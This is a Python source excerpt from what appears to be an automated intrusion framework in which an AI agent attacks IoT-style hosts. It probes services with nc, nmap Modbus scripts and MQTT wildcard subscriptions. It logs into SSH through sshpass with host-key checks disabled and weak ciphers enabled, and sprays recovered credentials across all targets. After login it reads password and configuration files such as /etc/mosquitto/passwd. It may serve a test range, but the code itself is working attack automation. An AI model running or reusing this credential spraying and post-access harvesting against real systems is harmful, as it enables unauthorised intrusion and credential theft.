        if missing_entry_points is None:
            missing_entry_keys = None
        else:
            missing_entry_keys = {
                (str(item[0]), str(item[1]))
                for item in missing_entry_points
                if isinstance(item, (list, tuple)) and len(item) >= 2
            }
        missing_credentials = coverage.get("missing_credentials") if isinstance(coverage, dict) else None
        missing_credential_labels = (
            None if missing_credentials is None
            else {str(item) for item in missing_credentials}
        )
        missing_credential_keys = coverage.get("missing_credential_keys") if isinstance(coverage, dict) else None
        if missing_credential_keys is None:
            missing_credential_key_set = None
        else:
            missing_credential_key_set = {
                (str(item[0]), str(item[1]), str(item[2]))
                for item in missing_credential_keys
                if isinstance(item, (list, tuple)) and len(item) >= 3
            }

        entry_actions = []
        # Reconcile entry-point evidence independently from credential reuse.
        # An entry probe is not a credential attempt and must not suppress the
        # later spray against that same device.
        for entry in context.get("entry_points", []):
            if not isinstance(entry, dict):
                continue
            ip = str(entry.get("device_ip") or entry.get("ip") or "").strip()
            service = str(entry.get("service") or "").strip().casefold()
            if not ip or (
                missing_entry_keys is not None
                and (ip, service) not in missing_entry_keys
            ):
                continue
            if service == "mqtt" and "mqtt_listen" in tool_map:
                entry_actions.append(("mqtt_listen", {"broker": ip, "topic": "#", "count": 1, "timeout": 3}))
            elif service in {"http", "https"} and "http_get" in tool_map:
                entry_actions.append(("http_get", {"url": f"http://{ip}/"}))
            elif service == "telnet" and "telnet_connect" in tool_map:
                entry_actions.append(("telnet_connect", {"command_string": f"echo quit | timeout 3 nc {ip} 23"}))
            elif service == "ftp" and "ftp_list" in tool_map:
                entry_actions.append(("ftp_list", {"url": f"ftp://{ip}/"}))
            elif service == "modbus" and "nmap_scan" in tool_map:
                entry_actions.append(("nmap_scan", {
                    "target": ip, "ports": "502",
                    "scripts": "modbus-discover", "skip_discovery": True,
                }))
            elif service in {"coap", "snmp"} and "udp_send" in tool_map:
                udp_action = _compact_udp_entry_action(ip, service)
                if udp_action is not None:
                    entry_actions.append(udp_action)
            elif service == "ssh" and "ssh_login" in tool_map:
                # Use only credentials already recovered in the authoritative
                # context; never invent a login for the fallback.
                matching = next(
                    (item for item in context.get("recovered_credentials", [])
                     if isinstance(item, dict) and str(item.get("source_ip") or "") == ip),
                    None,
                )
                if matching is not None:
                    user = str(matching.get("user") or "")
                    password = str(matching.get("password") or "")
                    if user and password:
                        command = (
                            f"sshpass -p {shlex.quote(password)} ssh "
                            "-o StrictHostKeyChecking=no "
                            "-o UserKnownHostsFile=/dev/null "
                            "-o ConnectTimeout=5 "
                            "-o KexAlgorithms=+diffie-hellman-group14-sha1,diffie-hellman-group-exchange-sha1 "
                            "-o HostKeyAlgorithms=+ssh-rsa "
                            "-o Ciphers=+aes128-cbc,aes192-cbc,aes256-cbc "
                            f"{shlex.quote(user)}@{ip} 'id'"
                        )
                        entry_actions.append(("ssh_login", {"command_string": command}))

        credentials = [
            item for item in context.get("recovered_credentials", [])
            if isinstance(item, dict) and str(item.get("user") or "").strip()
            and str(item.get("password") or "").strip()
        ]
        targets = [item for item in context.get("all_targets", []) if isinstance(item, dict)]
        credential_actions = []
        if "try_credential" in tool_map and credentials:
            # Round-robin by target so the bounded fallback improves breadth
            # instead of spending its entire budget on the first host.
            for credential_index in range(len(credentials)):
                for target in targets:
                    ip = str(target.get("device_ip") or target.get("ip") or "").strip()
                    if not ip:
                        continue
                    service = self._compact_intrusion_service(target)
                    credential = credentials[credential_index]
                    user = str(credential["user"])
                    password = str(credential["password"])
                    if missing_credential_key_set is not None:
                        if (ip, user, password) not in missing_credential_key_set:
                            continue
                    elif (
                        missing_credential_labels is not None
                        and f"{user}@{ip}" not in missing_credential_labels
                    ):
                        continue
                    credential_actions.append(("try_credential", {
                        "ip": ip,
                        "service": service,
                        "user": user,
                        "password": password,
                    }))

        actions = entry_actions + credential_actions

        executed = 0
        for name, kwargs in actions[:COMPACT_INTRUSION_FALLBACK_MAX_ACTIONS]:
            function = tool_map.get(name)
            if function is None:
                continue
            if stream_callback:
                stream_callback({"type": "tool_call", "name": name, "args": kwargs})
            try:
                result = function(**kwargs)
            except Exception as exc:
                log.warning("Compact Phase 5 fallback %s failed: %s", name, exc)
                continue
            executed += 1
            if stream_callback:
                stream_callback({"type": "tool_result", "name": name, "result": str(result)[:2000]})
        return executed

    def _run_compact_intrusion_post_access(self, config, stream_callback=None) -> int:
        """Harvest bounded evidence from every authenticated compact SSH access.

        The compact model is allowed to finish as soon as coverage is complete,
        which previously meant that a successful login could be recorded without
        any post-exploitation or pivot evidence. Replay only missing, already
        authenticated SSH sessions and keep the command read-only and bounded.
        Full profiles never call this recovery path.
        """
        if not self._uses_compact_local_moe():
            return 0
        log_path = self.run_dir / "tool_calls.jsonl"
        if not log_path.exists():
            return 0
        tools = runtime.filter_profile_tools(
            self.execution_profile, config.phase, self._resolve_tools(config)
        )
        ssh_exec = next(
            (tool for tool in tools if tool.get("name") == "ssh_exec"),
            None,
        )
        if not ssh_exec or not callable(ssh_exec.get("function")):
            return 0

        def credential_from_record(tool: str, args: dict) -> tuple[str, str]:
            user = str(args.get("user") or "").strip()
            password = str(args.get("password") or "").strip()
            if tool == "ssh_login":
                command = str(args.get("command_string") or "")
                password_match = re.search(
                    r"sshpass\s+-p\s+(?:'([^']*)'|\"([^\"]*)\"|([^\s]+))",
                    command,
                )
                user_match = re.search(
                    r"\b([A-Za-z0-9_.-]+)@(?:\d{1,3}\.){3}\d{1,3}\b",
                    command,
                )
                password = password or next(
                    (
                        group
                        for group in (
                            password_match.groups() if password_match else ()
                        )
                        if group
                    ),
                    "",
                )
                user = user or (user_match.group(1) if user_match else "")
            return user, password

        authenticated: dict[str, dict] = {}
        harvested: set[str] = set()
        for line in log_path.read_text(encoding="utf-8").splitlines():
            try:
                record = json.loads(line)
            except (TypeError, ValueError, json.JSONDecodeError):
                continue
            if record.get("phase") not in (5, "5"):
                continue
            tool = str(record.get("tool") or "")
            args = record.get("args") or {}
            if not isinstance(args, dict):
                continue
            result = record.get("result")
            if isinstance(result, str):
                try:
                    result = json.loads(result)
                except (TypeError, ValueError, json.JSONDecodeError):
                    result = {}
            if not isinstance(result, dict):
                continue
            stdout = str(result.get("stdout") or result.get("output") or "")
            success = (
                result.get("success") is True
                or result.get("return_code") == 0
                or (
                    tool == "ssh_login"
                    and bool(re.search(r"\buid=\d+", stdout))
                )
            )
            if tool in {"try_credential", "ssh_login"} and success:
                ip = str(args.get("ip") or "").strip()
                if tool == "ssh_login":
                    match = re.search(
                        r"(?:\d{1,3}\.){3}\d{1,3}",
                        str(args.get("command_string") or ""),
                    )
                    ip = ip or (match.group(0) if match else "")
                user, password = credential_from_record(tool, args)
                service = str(
                    args.get("service") or result.get("service") or "ssh"
                ).casefold()
                if ip and user and password and service == "ssh":
                    authenticated.setdefault(ip, {
                        "ip": ip,
                        "user": user,
                        "password": password,
                    })
            elif tool == "ssh_exec" and success:
                ip = str(args.get("ip") or "").strip()
                user = str(args.get("user") or "").strip()
                password = str(args.get("password") or "").strip()
                if ip and user and password:
                    harvested.add(ip)

        command = (
            "id; (hostname 2>/dev/null || true); "
            "for f in /etc/iot/config.json /etc/mosquitto/passwd "
            "/etc/mosquitto/mosquitto.conf; "
            "do if [ -r \"$f\" ]; then echo FILE:$f; "
            "sed -n '1,80p' \"$f\"; fi; done"
        )
        executed = 0
        for key, session in sorted(authenticated.items()):
            if key in harvested:
                continue
            kwargs = {**session, "command": command}
            if stream_callback:
                stream_callback({
                    "type": "tool_call",
                    "name": "ssh_exec",
                    "args": kwargs,
                })
            try:
                result = ssh_exec["function"](**kwargs)
            except Exception as exc:
                log.warning("Compact Phase 5 post-access harvest failed: %s", exc)
                continue
            executed += 1
            if stream_callback:
                stream_callback({
                    "type": "tool_result",
                    "name": "ssh_exec",
                    "result": str(result)[:2000],
                })
        return executed

    def _compact_intrusion_coverage(self) -> tuple[bool, dict]:
        """Return compact Phase 5 coverage from the authoritative tool ledger."""
        log_path = self.run_dir / "tool_calls.jsonl"
        context = self._load_compact_intrusion_context()
        if not isinstance(context, dict):
            return False, {"missing": ["invalid context"]}

        entries = {
            (
                str(item.get("device_ip") or item.get("ip") or "").strip(),
                str(item.get("service") or "").strip().casefold(),
            )
            for item in context.get("entry_points", [])
            if isinstance(item, dict)
        }
        entry_ports: dict[tuple[str, str], int] = {}
        for item in context.get("entry_points", []):
            if not isinstance(item, dict):
                continue
            ip = str(item.get("device_ip") or item.get("ip") or "").strip()
            service = str(item.get("service") or "").strip().casefold()
            try:
                port = int(item.get("port"))
            except (TypeError, ValueError):
                continue
            if ip and service:
                entry_ports[(ip, service)] = port
        target_specs = {}
        target_ports: dict[str, int] = {}
        service_ports = {
            21: "ftp", 22: "ssh", 23: "telnet", 80: "http", 443: "http",
            8080: "http", 8443: "http", 1883: "mqtt", 8883: "mqtt",
            9001: "mqtt", 502: "modbus", 161: "snmp", 5683: "coap",
            3306: "mysql", 6379: "redis",
        }
        default_ports = {
            "ftp": 21, "ssh": 22, "telnet": 23, "http": 80, "mqtt": 1883,
            "modbus": 502, "snmp": 161, "coap": 5683, "mysql": 3306,
            "redis": 6379,
        }
        for item in context.get("all_targets", []):
            if not isinstance(item, dict):
                continue
            ip = str(item.get("device_ip") or item.get("ip") or "").strip()
            if ip:
                service = self._compact_intrusion_service(item)
                target_specs[ip] = service
                ports = []
                for raw_port in item.get("services", []):
                    try:
                        port = int(raw_port)
                    except (TypeError, ValueError):
                        continue
                    if service_ports.get(port) == service:
                        ports.append(port)
                target_ports[ip] = min(ports) if ports else default_ports.get(service, 22)
        anonymous_target_services: set[tuple[str, str]] = set()
        for item in context.get("entry_points", []):
            if not isinstance(item, dict):
                continue
            ip = str(item.get("device_ip") or item.get("ip") or "").strip()
            service = str(item.get("service") or "").strip().casefold()
            if item.get("vuln_type") == "no_auth" and target_specs.get(ip) == service:
                anonymous_target_services.add((ip, service))

        credentials = {
            (str(item.get("user") or "").strip(), str(item.get("password") or "").strip())
            for item in context.get("recovered_credentials", [])
            if isinstance(item, dict) and item.get("user") and item.get("password")
        }
        seen_entries: set[tuple[str, str]] = set()
        entry_targets_without_service = {ip for ip, service in entries if ip and not service}
        seen_credentials: set[tuple[str, str, str]] = set()
        successful_accesses: set[tuple[str, str]] = set()
        seen_targets: set[tuple[str, str]] = set()

        def host_from_url(value: object) -> str:
            parsed = urlsplit(str(value or "").strip())
            return parsed.hostname or ""

        def target_from_record(tool: str, args: dict) -> str:
            for key in ("ip", "host", "broker", "target"):
                if args.get(key):
                    return str(args[key]).strip()
            if tool in {"http_get", "curl_headers", "ftp_list"}:
                return host_from_url(args.get("url"))
            if tool in {"telnet_connect", "ssh_login"}:
                match = re.search(r"(?:\d{1,3}\.){3}\d{1,3}", str(args.get("command_string") or ""))
                return match.group(0) if match else ""
            return ""
        def tool_service(tool: str, args: dict) -> str:
            if tool == "nmap_scan":
                ports = {part.strip() for part in str(args.get("ports") or "").split(",")}
                scripts = str(args.get("scripts") or "").casefold()
                if "502" in ports or "modbus-discover" in scripts:
                    return "modbus"
                return ""
            if tool == "udp_send":
                return _udp_service_for_port(args.get("port"))
            return {
                "mqtt_listen": "mqtt", "http_get": "http", "curl_headers": "http",
                "telnet_connect": "telnet", "ftp_list": "ftp", "ssh_login": "ssh", "ssh_exec": "ssh",
            }.get(tool, str(args.get("service") or "").casefold())

        entry_probe_tools = {
            "mqtt_listen", "http_get", "curl_headers", "telnet_connect",
            "ftp_list", "ssh_login", "try_credential", "nmap_scan", "udp_send",
        }
        if log_path.exists():
            for line in log_path.read_text(encoding="utf-8").splitlines():
                try:
                    record = json.loads(line)
                except (TypeError, ValueError, json.JSONDecodeError):
                    continue
                if record.get("phase") not in (5, "5", None):
                    continue
                if record.get("phase") is None and record.get("vuln_id"):
                    continue
                tool = str(record.get("tool") or "")
                args = record.get("args") or {}
                if not isinstance(args, dict):
                    continue
                target = target_from_record(tool, args)
                service = tool_service(tool, args)
                if tool == "try_credential" and target in target_specs and service == target_specs[target]:
                    try:
                        payload = json.loads(record.get("result", "{}"))
                    except (TypeError, ValueError, json.JSONDecodeError):
                        payload = {}
                    if isinstance(payload, dict) and (
                        payload.get("anonymous_access") is True
                        or payload.get("auth_required") is False
                    ):
                        anonymous_target_services.add((target, service))
                expected_port = target_ports.get(target)
                supplied_port = args.get("port")
                port_valid = True
                if tool == "try_credential" and supplied_port not in (None, ""):
                    try:
                        port_valid = int(supplied_port) == expected_port
                    except (TypeError, ValueError):
                        port_valid = False
                if tool == "nmap_scan":
                    requested_ports = {
                        part.strip() for part in str(args.get("ports") or "").split(",")
                    }
                    requested_scripts = str(args.get("scripts") or "").casefold()
                    port_valid = (
                        "502" in requested_ports
                        and "modbus-discover" in requested_scripts
                    )
                    raw_result = record.get("result")
                    try:
                        result_payload = json.loads(raw_result) if isinstance(raw_result, str) else raw_result
                    except (TypeError, ValueError, json.JSONDecodeError):
                        result_payload = None
                    if isinstance(result_payload, dict):
                        port_valid = port_valid and not (
                            result_payload.get("ok") is False
                            or result_payload.get("status") == "ERROR"
                            or result_payload.get("return_code") not in (None, 0)
                            or bool(result_payload.get("error"))
                        )
                    elif isinstance(raw_result, str) and raw_result.startswith("Error"):
                        port_valid = False
                if tool == "udp_send":
                    expected_entry_port = entry_ports.get((target, service))
                    if expected_entry_port is not None:
                        try:
                            port_valid = int(supplied_port) == expected_entry_port
                        except (TypeError, ValueError):
                            port_valid = False
                if (
                    tool in {"try_credential", "ssh_exec", "ssh_login"}
                    and target in target_specs
                    and service == target_specs.get(target)
                    and port_valid
                ):
                    try:
                        payload = json.loads(record.get("result", "{}"))
                    except (TypeError, ValueError, json.JSONDecodeError):
                        payload = {}
                    if isinstance(payload, dict) and (
                        (tool == "try_credential" and payload.get("success") is True and payload.get("authenticated", True) is not False)
                        or (tool in {"ssh_exec", "ssh_login"} and (payload.get("success") is True or payload.get("return_code") == 0))
                        or (tool == "ssh_login" and re.search(r"\buid=\d+", str(payload.get("stdout") or payload.get("output") or "")))
                    ):
                        successful_accesses.add((target, service))
                if port_valid and tool in entry_probe_tools and (target, service) in entries:
                    seen_entries.add((target, service))
                elif port_valid and tool in entry_probe_tools and target in entry_targets_without_service:
                    # Older/fallback contexts may omit the service. In that
                    # case any observable action on the declared entry host is
                    # the strongest evidence available.
                    seen_entries.add((target, ""))
                if target in target_specs and port_valid:
                    seen_targets.add((target, service))
                if tool == "try_credential" and target in target_specs and port_valid:
                    user = str(args.get("user") or "").strip()
                    password = str(args.get("password") or "").strip()
                    if (user, password) in credentials and service == target_specs[target]:
                        seen_credentials.add((target, user, password))

        missing_entries = sorted(entries - seen_entries)
        missing_credentials = sorted(
            f"{user}@{target}"
            for target in target_specs
            for user, password in credentials
            if (target, target_specs[target]) not in anonymous_target_services
            and (target, user, password) not in seen_credentials
        )
        missing_credential_keys = [
            [target, user, password]
            for target in sorted(target_specs)
            for user, password in sorted(credentials)
            if (target, target_specs[target]) not in anonymous_target_services
            and (target, user, password) not in seen_credentials
        ]
        missing_targets = sorted(
            f"{target}:{service}"
            for target, service in target_specs.items()
            if (target, service) not in seen_targets
            and (target, service) not in anonymous_target_services
            and not credentials
        )
        requires_successful_access = bool(credentials) and any(
            (target, service) not in anonymous_target_services
            for target, service in target_specs.items()
        )
        missing_successful_access = requires_successful_access and not successful_accesses
        return not missing_entries and not missing_credentials and not missing_targets and not missing_successful_access, {
            "missing_entry_points": missing_entries,
            "missing_successful_access": missing_successful_access,
            "successful_accesses": [
                {"target": target, "service": service}
                for target, service in sorted(successful_accesses)
            ],
            "missing_credential_keys": missing_credential_keys,
            "missing_credentials": missing_credentials,
            "missing_targets": missing_targets,
        }

    def _compact_intrusion_completion_succeeded(self) -> bool:
        """Return whether compact Phase 5 called its terminal successfully."""
        log_path = self.run_dir / "tool_calls.jsonl"
        if not log_path.exists():
            return False
        for line in reversed(log_path.read_text(encoding="utf-8").splitlines()):
            try:
                record = json.loads(line)
            except (TypeError, ValueError, json.JSONDecodeError):
                continue
            if record.get("tool") != COMPACT_INTRUSION_COMPLETION_TOOL:
                continue
            if record.get("phase") not in (5, "5", None):
                continue
            payload = record.get("result")
            if isinstance(payload, str):
                try:
                    payload = json.loads(payload)
                except (TypeError, ValueError, json.JSONDecodeError):
                    continue
            if isinstance(payload, dict) and payload.get("ok") is True:
                return True
        return False

    def _write_compact_intrusion_deliverable(self, *, note: str) -> bool:
        """Commit the compact Phase 5 artifact from the authoritative ledger."""
        data = self._synthesize_intrusion_from_tools(note=note)
        if not has_observable_actions(data):
            return False
        data["status"] = "completed"
        data["completion_source"] = COMPACT_INTRUSION_COMPLETION_TOOL
        path = self.run_dir / "05_intrusion.json"
        path.write_text(json.dumps(data, indent=2, ensure_ascii=False), encoding="utf-8")
        validator = runtime.VALIDATORS.get("json_valid", runtime.VALIDATORS["default"])
        valid, _ = validator("05_intrusion.json")
        return valid
